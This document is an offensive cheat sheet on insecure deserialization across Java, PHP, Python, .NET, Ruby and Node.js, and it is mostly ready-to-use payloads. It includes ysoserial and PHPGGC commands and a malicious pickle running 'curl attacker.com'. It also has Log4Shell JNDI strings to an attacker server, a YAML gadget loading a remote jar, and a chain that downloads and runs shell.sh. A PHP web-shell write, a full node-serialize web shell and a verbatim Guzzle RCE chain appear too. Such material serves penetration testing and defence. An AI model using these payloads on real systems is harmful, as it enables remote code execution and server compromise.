# Insecure Deserialization

## Overview
Exploitation of insecure deserialization of user-supplied data leading to RCE, authentication bypass, and privilege escalation.

## Detection

### Java Serialization
```
# Binary magic bytes: AC ED 00 05
# Base64: rO0AB... (common in cookies, parameters)
# Content-Type: application/x-java-serialized-object

# Identify libraries in use:
- Apache Commons Collections (cc1-cc7)
- Spring Framework
- JBoss/WildFly
- WebLogic
- Jenkins

# Test with ysoserial:
java -jar ysoserial.jar CommonsCollections1 "curl attacker.com" | base64
```

### PHP Serialization
```
# Format: O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"pass";s:4:"test";}
# a: = array, O: = object, s: = string, i: = int, b: = bool, N: = null

# Common magic methods exploited:
__wakeup()   - called on unserialize()
__destruct() - called when object destroyed
__toString() - called when cast to string
__sleep()    - called on serialize()

# Look in: cookies (PHPSESSID, user_data), hidden fields, API parameters
```

### Python Pickle
```
# Pickle format identifiers: \x80\x02 or starts with 'c' module
# Base64 encoded pickles in cookies/params

# Craft malicious pickle:
import pickle, os, base64
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('curl attacker.com',))
payload = base64.b64encode(pickle.dumps(Exploit()))
```

### .NET / C# BinaryFormatter
```
# Binary format, often in ViewState, cookies, SOAP
# Look for __VIEWSTATE, __EVENTVALIDATION parameters
# Libraries: ObjectStateFormatter, LosFormatter, BinaryFormatter

# Tools: ysoserial.net for gadget chains
ysoserial.exe -g ObjectDataProvider -f BinaryFormatter -c "calc"
```

### Ruby Marshal
```
# Marshal.load on user input
# Gadget chains via ActiveRecord, ActiveSupport

# Craft: Marshal.dump(malicious_object)
```

## Java Exploitation with ysoserial
```
# Generate payloads for different gadget chains:
java -jar ysoserial.jar CommonsCollections1 "cmd" > payload.bin
java -jar ysoserial.jar CommonsCollections2 "cmd" > payload.bin
java -jar ysoserial.jar Spring1 "cmd" > payload.bin
java -jar ysoserial.jar Groovy1 "cmd" > payload.bin
java -jar ysoserial.jar JRMPClient "attacker.com:1099" > payload.bin

# Test each gadget chain as different libraries may be present
```

## PHP Object Injection
```
# Example vulnerable code:
$data = unserialize($_COOKIE['user']);

# Find classes with magic methods in application codebase
# Chain __wakeup → __destruct → file write / RCE

# Example payload for file write:
O:7:"PHPFile":2:{s:4:"name";s:15:"/var/www/evil.php";s:7:"content";s:22:"<?php system($_GET[0]);?>";}

# PHPGGC — PHP Generic Gadget Chains:
phpggc Laravel/RCE7 system whoami
phpggc Symfony/RCE4 system whoami
phpggc Monolog/RCE1 system whoami
```

## ViewState Exploitation (.NET)
```
# If ViewState MAC validation disabled:
# Modify ViewState to inject serialized payload

# If MAC key known (leaked, default):
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "calc" --path "/" --apppath "/" --islegacy

# Test with empty/null MAC key
# Check web.config for machineKey
```

## Node.js / JavaScript
```
# node-serialize package vulnerability
# Serialize function strings that get eval'd on deserialize
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}

# serialize-javascript, fast-json-stringify edge cases
```

## Testing Methodology
1. Find serialized data: cookies, hidden fields, request bodies, headers
2. Identify format (base64 decode, check magic bytes)
3. Identify framework/language/libraries
4. Select appropriate gadget chain
5. Generate payload (DNS callback first to confirm deserialization)
6. Escalate to RCE
7. Test blind: use out-of-band (DNS/HTTP callback to Burp Collaborator)

## Blind Detection
```
# Use DNS callback to confirm deserialization without visible output
# ysoserial payload that pings attacker.com
java -jar ysoserial.jar CommonsCollections1 "nslookup attacker.burpcollaborator.net"

# If DNS query received → vulnerable
```

## Tools
- `ysoserial` — Java gadget chains
- `PHPGGC` — PHP gadget chains
- `ysoserial.net` — .NET gadget chains
- Burp Deserialization Scanner extension
- `SerializationDumper` — Java serialization analysis


## Additional Techniques — ported from WebSkills (writeup-techniques/deserialization)

### Java — SnakeYAML unsafe `Yaml.load()`
`Yaml.load()` instantiates arbitrary types (plain text, no magic bytes). Classic gadget = `ScriptEngineManager` + remote `URLClassLoader` fetching a jar → RCE:
```yaml
!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker/exploit.jar"]]]]
```
Also reachable via Spring Cloud actuator `env` → XStream/YAML on Eureka `serviceURL` (marshalsec).

### Java — XStream as a first-class sink (RCE **and** SSRF)
`XStream`/`XMLDecoder` unmarshal XML into arbitrary object graphs. Beyond WebLogic XMLDecoder (already covered): XStream `CVE-2021-39141/39144/39150/39152`, Struts S2-052 REST plugin (unfiltered XStream), Jenkins Groovy-classpath `CVE-2016-0792`, ForgeRock AM `CVE-2021-35464`. XStream unmarshal also fetches an attacker URL → **SSRF** (intranet/localhost) even without a working RCE gadget. Error-signature fingerprint: `ConversionException` / `UnmarshallingFailureException`.

### Java — JNDI injection / Log4Shell concrete payloads (CVE-2021-44228)
App resolves an attacker JNDI URL directly, or via a Log4j `${jndi:...}` lookup in **any logged string** (`User-Agent`, any header/param). Serve the class over HTTP with an LDAP/RMI referrer using **marshalsec**:
```
${jndi:ldap://attacker-server/Exploit}
${jndi:rmi://attacker-server/a}    ${jndi:iiop://attacker-server/a}
```
2.15.0 fix was incomplete → `CVE-2021-45046` (message-lookup bypass before 2.16). If `trustURLCodebase=true` → remote class load; otherwise return a classpath gadget via LDAP, or pivot with ysoserial `JRMPListener` over the `jndi:rmi` handler.

### Java — JDBC connection-string RCE + service pivots
- **PostgreSQL JDBC** driver `9.4.1208` connection string → `ClassPathXmlApplicationContext()` RCE (`CVE-2022-21724`).
- Deserialization service pivots that take an attacker blob into the protocol frame (drop a ysoserial gadget): RMI:1099, JMXInvokerServlet (JBoss), WebLogic T3, WSUS/ManageEngine OpManager SumPDU.

### Java — bypassing look-ahead / validating deserialization (`SignedObject`)
When an `ObjectInputFilter` / `ValidatingObjectInputStream` allow-list constrains the outer type, wrap the real gadget (e.g. `CommonsBeanutils1`) inside an allowed `SignedObject` — the inner object from `SignedObject.getObject()` still fires, **but only after a signature gate** against a product-baked public key (`com.linoma.license.gen2.BundleWorker.verify` pattern). Needs a valid key or a re-deserialize path that skips re-filtering:
```
payload=$(java -jar ysoserial.jar CommonsBeanutils1 "wget $ip/shell.sh -O /tmp/shell.sh" | base64 | tr -d "\n")
payload2=$(java -jar ysoserial.jar CommonsBeanutils1 "bash /tmp/shell.sh"               | base64 | tr -d "\n")
```

### PHP — Guzzle `rce1` POP chain (verbatim) and `phar://` detail
Verbatim Guzzle `guzzle/rce1` chain (→ `system('id')`), as used against Drupal 8 REST `link.options` (SA-CORE-2019-003 / SA-CORE-2024-008):
```
O:24:"GuzzleHttp\Psr7\FnStream":2:{s:33:"\0GuzzleHttp\Psr7\FnStream\0methods";a:1:{s:5:"close";a:2:{i:0;O:23:"GuzzleHttp\HandlerStack":3:{s:32:"\0GuzzleHttp\HandlerStack\0handler";s:2:"id";s:30:"\0GuzzleHttp\HandlerStack\0stack";a:1:{i:0;a:1:{i:0;s:6:"system";}}s:31:"\0GuzzleHttp\HandlerStack\0cached";b:0;}i:1;s:7:"resolve";}}s:9:"_fn_close";a:2:{i:0;r:4;i:1;s:7:"resolve";}}
```
Build: `./phpggc guzzle/rce1 system id --json`. `\0` prefixes protected/private property names.
`phar://` variant needs **no `unserialize()` call**: on PHP < 8.0, ANY filesystem op (`file_exists`/`fopen`/`getimagesize`/html2pdf/TCPDF) on a `phar://` path unserializes the archive **metadata** → POP chain. Upload a Phar renamed to `.jpg`/`.gif`, then point any fs op at `phar://uploaded.jpg`. Build metadata with PHPGGC `phar` mode. Mitigation note: `unserialize($x, ['allowed_classes'=>FALSE])` blocks objects — find a sink without that flag.

### PHP — SPIP `#ENV` regex-bypass (CVE-2023-27372)
`protege_champ()` guards `unserialize()` with a weak `preg_match(",^[abis]:\d+[:;],", $texte)` that is bypassable. Reset-password page `spip.php?page=spip_pass`, `oubli` param → RCE. Confirm benign first:
```
oubli=s:19:"<?php phpinfo(); ?>";
```

### Python — PyYAML, Keras/marshal, and AI-model deserialization
`yaml.load()` without `SafeLoader`:
```yaml
!!python/object/apply:os.system ['id']
```
AI/ML model checkpoints are live sinks: `torch.load`; Keras `Lambda.from_config` → `python_utils.func_load(...)` base64-decodes and calls `marshal.loads` on attacker bytes in a saved model's `config.json`; InvokeAI / Hydra. Wazuh `__unhandled_exc__` JSON → `as_wazuh_object` deserialization (`CVE-2025-24016`, critical). Non-crashing confirm: send `__unhandled_exc__` with a non-existent class → `NameError` in the response proves the sink without crashing the server. (Pickle can also import any installed package even inside a "sandbox" — e.g. import `pip` to run code.)

### Ruby — universal `Marshal.load` gadget, Psych YAML, and log-injection eval
`Marshal.load(attacker_bytes)` → RCE via the **universal gadget chain** (Luke Jahnke, Ruby 2.x, no external libs). `YAML.load`/Psych `--- !ruby/object:` instantiates arbitrary Ruby objects. **Log-injection variant**: craft a param so the logged line becomes valid Ruby that is later `eval`'d — start the payload on a new line to escape the `#`-commented `INFO` prefix. Real case: GitHub Enterprise default session secret → Marshal RCE. Ruby class pollution is a related primitive.

### .NET — Json.NET `TypeNameHandling` and the wider gadget catalog
Beyond `BinaryFormatter`/`LosFormatter`/ViewState: `Json.NET` and `DataSet` with `TypeNameHandling` deserialize attacker-chosen types. Verbatim Json.NET shape (WPF `ObjectDataProvider` via `ExpandedWrapper`):
```json
{"$type":"System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Data.ObjectDataProvider, PresentationFramework, ...],[...]]","ExpandedElement":{...},"ProjectedProperty0":{"MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, ..."}}}
```
Gadget menu (ysoserial.net / YSoNet): `TypeConfuseDelegate`, `TextFormattingRunProperties`, `ObjectDataProvider` (also via `XmlSerializer`), `ActivitySurrogateSelector` (bypasses ≥4.8 type-filter, compiles C# on the fly), `DataSetOldBehaviour`, `GetterCompilerResults` (.NET 5+ WPF), `PSObject` (`CVE-2017-8565`).
```
ysoserial.exe -g TextFormattingRunProperties -f LosFormatter -c "command"
```

### .NET — ViewState machineKey recovery + recycled-key + ToolShell chain
If MAC/encryption is OFF, forge directly. If signed, recover `machineKey` (`validationKey`/`decryptionKey`) via file-read or leaked sample keys, then forge. Tooling: **python blacklist3r**, **Badsecrets**, **BBOT viewstate module** (feed a candidate-key wordlist until MAC verifies). Key facts:
- Pre-4.5 presence-only check → send payload **unencrypted with `__VIEWSTATE` present** even when `viewStateEncryptionMode=Always`.
- **Recycled keys at scale**: admins copy sample `machineKey` blocks from MS docs / StackOverflow → one leaked key hijacks every ASP.NET page in the farm.
- **SharePoint "ToolShell"** (`CVE-2025-49704/49706/53770/53771`): auth bypass `Referer: /_layouts/SignOut.aspx` + forged ViewState gadget → drop `spinstall0.aspx`, steal `machineKey` (in-the-wild). Related: Telerik `WebResource.axd` unsafe reflection; Sitecore `CSRFTOKEN` + pre-auth `AssemblyResolve` DLL plant (`CVE-2025-3600`).

### Node.js — IIFE auto-invoke, full web-shell, prototype-pollution → RCE, React RSC
`node-serialize` (`CVE-2017-5941`): a function value tagged `_$$ND_FUNC$$_` is eval'd; append `()` (IIFE) so it auto-invokes on parse. Full web-shell variant (binds :443, `?cmd=`):
```
_$$ND_FUNC$$_function(){const http=require('http');const url=require('url');const ps=require('child_process');http.createServer(function(req,res){var q=url.parse(req.url,true).query;var cmd=q['cmd'];try{ps.exec(cmd,function(e,stdout,stderr){res.end(stdout);});}catch(e){return;}}).listen(443);}()
```
Also: Node prototype-pollution → RCE gadget chains (HackTricks Express gadgets, `qs`/`body-parser` nested-key parsing → `__proto__`), and React RSC `renderToReadableStream()` deserialization RCE.

### Parser differentials & Go (un)marshal (auth bypass / mass-assignment, not gadget RCE)
Go JSON/XML/YAML insecure defaults: missing struct tags (fields still parsed), duplicate keys (Go takes last, Jackson takes first), case-insensitivity/Unicode tricks → auth bypass / privesc / mass-assignment, and defeats allow-lists done by a different parser than the sink. Precedents: `CVE-2017-12635` CouchDB duplicate-key bypass, Zoom 0-click XML differential, GitLab 2025 SAML XML bypass.

### Detection additions
- **Java `URLDNS`** gadget — no gadget deps, works on any classpath; a DNS hit to Collaborator proves the blob reaches `readObject()` before firing a real RCE chain:
```
java -jar ysoserial.jar URLDNS "http://COLLAB.oastify.com"
```
- Magic-prefix quick-ID (base64 leading bytes): Java gzip'd `H4sIA`, .NET `BinaryFormatter` `AAEAAAD/////`, .NET ViewState `/wEy…`/`/wEP…`, Python pickle `gAS…`, Ruby Marshal `BAg…`; YAML tags `--- !ruby/object:` / `!!python/object`.
